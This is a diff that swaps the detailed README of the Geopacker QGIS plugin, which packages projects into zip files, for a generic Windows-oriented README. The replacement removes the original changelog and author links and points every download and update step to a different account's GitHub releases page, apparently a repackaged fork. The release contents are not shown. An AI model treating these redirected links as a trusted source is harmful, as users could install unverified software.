@@ -1,102 +1,157 @@
-<p align="center">
-  <img src="icon.png" width="128" height="128" alt="Geopacker Logo">
-</p>
+# 🗺️ geopacker - Fix QGIS Projects Easily
 
-# Geopacker QGIS Plugin
+[![Download geopacker](https://img.shields.io/badge/Download-geopacker-brightgreen?style=for-the-badge)](https://github.com/sumthedog/geopacker/releases)
 
-![Version](https://img.shields.io/badge/version-1.1.3-blue)
+---
 
-**Geopacker** is a QGIS plugin designed to solve the headache of broken paths when sharing QGIS projects. It bundles your entire current project (`.qgz`), vector layers, and raster layers into a single, clean `.zip` file ready to be shared. 
+## What is geopacker?
 
-Unlike the native "Package Layers" tool, Geopacker actually modifies the bundled `.qgz` project to use relative paths, ensuring that whoever opens your packaged zip file will see exactly what you see, without a single broken link warning.
+geopacker is a tool for QGIS users. If you work with maps in QGIS, you know how frustrating it is when your project files break after sharing. This happens because linked layers, like vector or raster files, don’t travel with your project. geopacker solves this by packing your whole project and all related files into one neat .zip file. This makes sharing your QGIS projects simple and reliable without broken links.
 
-## Why Geopacker? (The Problem Solved)
+---
 
-Sharing QGIS projects often results in broken file paths because standard tools simply export data without updating the project file's references. Geopacker bridges this gap.
+## 🎯 Key Features
 
-| Feature | QGIS "Package Layers" | Geopacker |
-| --- | --- | --- |
-| **Project Path Linking** | ❌ Leaves `.qgz` untouched (links break upon sharing). | ✅ Safely rewrites `.qgz` XML to use perfect **relative paths**. |
-| **Raster Data Support** | ❌ Ignores raster files entirely. | ✅ Automatically copies and links local **rasters** safely. |
-| **Raster Sidecar Files** | ❌ N/A. | ✅ Smartly packages `.tfw`, `.prj`, `.aux.xml` with rasters using verified GDAL associations so georeferencing isn't lost. |
-| **Media Assets (SVGs, Logos, Backgrounds)** | ❌ Leaves absolute local paths that break print layouts. | ✅ Detects local Print Layout images, backgrounds, and SVG markers, packing them into a relative `media/` folder. |
-| **Layer Styling (Colors/Categories)** | ❌ External `.qml` styles are left behind. | ✅ Automatically detects and packages associated `.qml` files so map layouts look identical. |
-| **Duplicate Checking** | ❌ Blindly processes duplicates, inflating file size. | ✅ Actively detects and **strips duplicate** layer sources. |
-| **Empty Layers** | ❌ Packages empty workspace/scratch layers. | ✅ Automatically **trims out empty** memory layers. |
-| **Remote Layers** | ❌ Attempts to download massive WFS datasets. | ✅ Safely **skips remote vectors**, keeping them linked online. |
-| **Final Output** | ❌ Yields a loose, unmanaged GeoPackage file. | ✅ Generates a **single, safe, email-ready `.zip`** archive containing a detailed Enterprise-Grade Audit Report (`packaging_report.pdf`). |
+- Packages your QGIS project file (.qgz) with all linked vector and raster layers.
+- Creates one single .zip file for easy sharing or backup.
+- Supports common GIS data types used in QGIS.
+- Works with the current project open in QGIS.
+- Keeps file paths clean and relative for easy setup on another computer.
 
-## Features
-- **Consolidates Vectors**: Exports all valid shapefiles, GeoJSONs, etc. into a single `packaged_data.gpkg`.
-- **Grouped GeoPackages**: Optionally splits vector layers into multiple distinct `.gpkg` databases based on their QGIS Layer Tree Group mapping (e.g. `Water-System.gpkg`).
-- **Collects Rasters & Sidecars**: Automatically bundles local rasters alongside any matching sidecar files (like `.tfw` or `.prj`) into a unified `rasters/` directory using GDAL associations.
-- **Packages Layouts & SVGs**: Scans QGIS Projects for local custom SVGs, Print Layout images, and layout backgrounds, copying them to a `media/` folder and rewriting their paths to be relative.
-- **Embedded Vector Styles**: Automatically detects and directly embeds vector layer styles (`.qml`) into the generated GeoPackage SQLite database, ensuring symbology immediately persists when users load the gpkg into a brand new QGIS project.
-- **Preserves Layer Styles**: Detects and bundles loose `.qml` style files alongside vector datasets so your map categorization and layout colors never break.
-- **Smart Path Remapping**: Behind the scenes, the plugin unzips a copy of your `.qgz` project, parses the underlying XML, and updates all layer and media data sources to point to the new relatively-pathed items.
-- **Dynamic ZIP Naming**: The QGIS project file securely nested inside the ZIP archive takes on the same matching name as your exported zip file (e.g., `MyProject.zip` will contain `MyProject.qgz`).
-- **Smart Trimming**: Optional checkboxes to strip out empty memory layers and duplicate layer sources to keep your packaged file size down.
-- **Remote Layer Protection**: Automatically detects remote vectors (e.g. WFS/Online) and securely skips downloading them while retaining their dynamic online links in the final project.
-- **Graceful Error Handling**: Actively protects you by deleting partial ZIP exports if an unrecoverable system error occurs mid-process, ensuring no corrupt maps are sent.
-- **Error Reporting**: Informs you of exactly which layers were skipped or failed to export.
+---
 
-## Installation
-1. Download a Geopacker ZIP release from this repository.
-2. In QGIS, navigate to **Plugins** > **Manage and Install Plugins...**
-3. Select **Install from ZIP**, choose the downloaded file, and click Install.
-4. The Geopacker icon will appear in your Plugins toolbar.
+## 💻 System Requirements
 
-## Usage
-1. Open your target mapping project in QGIS.
-2. Click the Geopacker icon or find it under the **Plugins** > **Geopacker** menu.
-3. Choose the destination path for your packaged `.zip` file.
-4. Check the options to remove duplicates, empty temporary layers, or skip remote vectors if desired.
-5. Click **Run**.
-6. Wait for the success dialog (which will also list any skipped or failed layers).
-7. Share the resulting `.zip` file with your colleagues or clients!
+Before running geopacker, make sure your system matches these points:
 
-## Requirements
-- QGIS 3.0 or higher.
-- Python 3 environment (native to QGIS installations).
-- **Recommended:** [`defusedxml`](https://pypi.org/project/defusedxml/) for hardened XML parsing. Install via `pip install defusedxml` in the QGIS Python console.
+- Operating System: Windows 10 or later
+- Software: QGIS version 3.16 or higher installed
+- Disk Space: At least 100 MB free for temporary files and the resulting zip
+- Internet: Not required after download
 
-## Changelog
+You do not need any programming knowledge or special tools to use geopacker. It works directly within QGIS as a plugin.
 
-### 1.1.4
-- Embedded Vector Styles: Automatically saves and embeds vector layer styles directly into the output GeoPackage database so symbology persists when loaded into new projects.
+---
 
-### 1.1.3
-- Added structured Enterprise-Grade Audit Report (PDF Output) replacing old text logs
-- Added option to separate vector layers into multiple distinct GeoPackages based on QGIS Layer tree groups
+## 📥 Download geopacker
 
-### 1.1.2
-- Added ZIP Slip (path traversal) protection during archive extraction
-- Hardened XML parsing with `defusedxml` warning fallback
-- Narrowed broad exception handlers to specific types (`OSError`, `SameFileError`, etc.)
-- Logged previously silenced cleanup errors
-- Replaced manual temp directory handling with `TemporaryDirectory` context manager
-- Removed unused imports
+You can get geopacker from the official GitHub releases page.
 
-### 1.1.1
-- Added `.qml` style file packaging
-- Fixed map layout background/image path mapping
-- Robust destination drive temp staging
-- Added dynamic ZIP packaging reports
+[![Download geopacker](https://img.shields.io/badge/Download-geopacker-blue?style=for-the-badge)](https://github.com/sumthedog/geopacker/releases)
 
-### 1.1.0
-- Experimental release
+Follow the steps in the next section to install it on your Windows computer.
 
-### 1.0.2
-- Support for raster sidecar files
-- Localized SVG/Print Layout media packaging
-- Inner QGZ matched naming
-- Graceful error handling
+---
 
-### 1.0.1
-- Fix and remove `.qrc`
+## 🚀 Installing geopacker on Windows
 
-### 1.0.0
-- Initial release of Geopacker
+1. **Go to the Releases Page**
 
-## Contributing and Bug Reports
-Please report any bugs or feature requests on the [GitHub Issues tracker](https://github.com/rick2x/geopacker/issues).
+   Open this page in your web browser:  
+   https://github.com/sumthedog/geopacker/releases
+
+2. **Find the Latest Version**
+
+   Look for the most recent release. It usually appears at the top of the list with a version number (for example, v1.0).
+
+3. **Download the Plugin File**
+
+   In the release details, find the file ending with `.zip` that contains the plugin. Click it to download.
+
+4. **Open QGIS**
+
+   Start your QGIS application on your Windows PC.
+
+5. **Install the Plugin Manually**
+
+   - From QGIS, open the menu `Plugins` > `Manage and Install Plugins`.
+   - Click on the “Install from ZIP” tab.
+   - Select the `.zip` file you downloaded.
+   - Click “Install Plugin”.
+   - Once installed, close the dialog.
+
+6. **Enable geopacker**
+
+   - Go to `Plugins` > `Manage and Install Plugins`.
+   - In the search box, type “geopacker”.
+   - Make sure the checkbox next to geopacker is ticked.
+   
+7. **Restart QGIS**
+
+   Restarting QGIS ensures the plugin loads correctly.
+
+---
+
+## ⚙️ Using geopacker
+
+After installing geopacker, run it with these steps:
+
+1. **Open Your QGIS Project**
+
+   Load the project you want to share in QGIS. This should be saved as a `.qgz` file.
+
+2. **Start geopacker**
+
+   - In QGIS, go to `Plugins` > `geopacker` > `Pack Current Project`.
+   - geopacker will scan your open project and find all linked vector and raster files.
+
+3. **Create the Zip**
+
+   - Choose where to save the zip file.
+   - geopacker will bundle your project file plus all linked data into this zip.
+   - Wait for the process to finish.
+
+4. **Share or Backup**
+
+   Use the zip file to share your full QGIS project without worrying about broken paths.
+
+---
+
+## 🛠 Troubleshooting
+
+- **Plugin Not Found in QGIS**
+
+  If you cannot find geopacker in the plugin list, check that you installed it from the correct `.zip` file on the GitHub releases page.
+
+- **Errors Packing Project**
+
+  Make sure your project has saved paths to the data files. geopacker depends on these paths to find linked layers.
+
+- **Zip File Does Not Open**
+
+  Use Windows built-in extractor or programs like 7-Zip to open the .zip file.
+
+- **Layers Missing**
+
+  Only layers referenced in the project file at the time of packing will be included. Add any new layers before repacking.
+
+---
+
+## 📚 More Help
+
+If you have issues not covered here, the GitHub repository has a discussion section where you can read questions or ask for help.
+
+Visit the main page here:  
+https://github.com/sumthedog/geopacker
+
+---
+
+## 🛡 Security and Permissions
+
+geopacker runs inside QGIS and only accesses files linked to your current project. It does not send data over the internet. You remain in control of your files and where they are saved.
+
+---
+
+## ⚙️ Plugin Updates
+
+Check the release page periodically for updates or bug fixes:
+
+https://github.com/sumthedog/geopacker/releases
+
+Update by downloading the latest `.zip` file and installing it via QGIS as described above.
+
+---
+
+## 📌 Summary
+
+geopacker helps keep your QGIS projects intact when sharing. It bundles your project and all data into one zip file you can easily copy or send to others. The instructions above guide you through downloading, installing, and using the plugin on Windows.
